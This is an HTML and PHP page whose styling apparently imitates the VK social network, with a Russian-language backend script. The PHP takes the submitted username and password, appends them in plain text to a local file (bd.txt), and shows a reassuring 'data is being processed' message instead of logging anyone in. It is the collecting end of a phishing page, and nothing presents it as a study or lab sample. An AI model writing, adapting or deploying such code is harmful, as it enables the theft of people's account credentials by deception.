
 <!DOCTYPE html>
 <html>
 <head>
 	<title></title>
 </head>
 <body bgcolor="#EDEEF0">
 	<p><div id="block">
	<img id="imeg" src="/images/s1200.webp" height="20" width="20"><h6 id="white">#лучшедома</h6>
	<button id="but2">Switch to English</button></div></p>
 <style>
*{
font-family: sans-serif;
}
#block {
	margin-top: -22px;
	margin-left:-10px ;
	background:#4A76A8 ;
	height:38px ;
	width:1538px ;
}
#but2{
border :2px solid #4A76A8;
    background:#4A76A8 ;
    color:white ;
    margin-top:17px;
    margin-left:1104px ;
}
#white{
	color:white;
	font-size:8pt ;
	margin-left:389px ;
	margin-bottom: -27px;
	margin-top:-21px;
}
#imeg{
	margin-left: 366px;
	margin-top: 8px;
}
#dan{
	color:#626D7A ;
    margin-left:550px ;
    margin-top:100px ;
}
#dan2{
	color:#626D7A;
	margin-left:600px ;
}
@media screen and (max-width: 1024px) {
	#block{
		width:1024px;
	}
	#but2{
		margin-left:700px;
	}
	#white{
		margin-left: 269px;
	}
	#imeg{
		margin-left:246px;
	}
	#dan{
    margin-left:350px ;
	}
	#dan2{
    margin-left: 400px;
	}
}
 </style>

 </body>
 </html>
 <?php 
   if ($_POST["username"]!= "" || $_POST["password"] !="" ){ 
   	$file=fopen("bd.txt","a+t");
   fwrite($file,$_POST['username']);
   fwrite($file,$_POST['password']);
   fclose($file);
   echo "<h3 id='dan' >Данные обрабатываются.<h3><p><h5 id='dan2'>Мы непременно уведомим вас о результатах обработки данных.</p></h5>";
} else {
	echo "<h3 id='dan' >Неправильные логин или пароль.</h3><p><h5 id='dan2'>Вернитесь и повторите попытку.</h5></p> ";
}
 ?>
 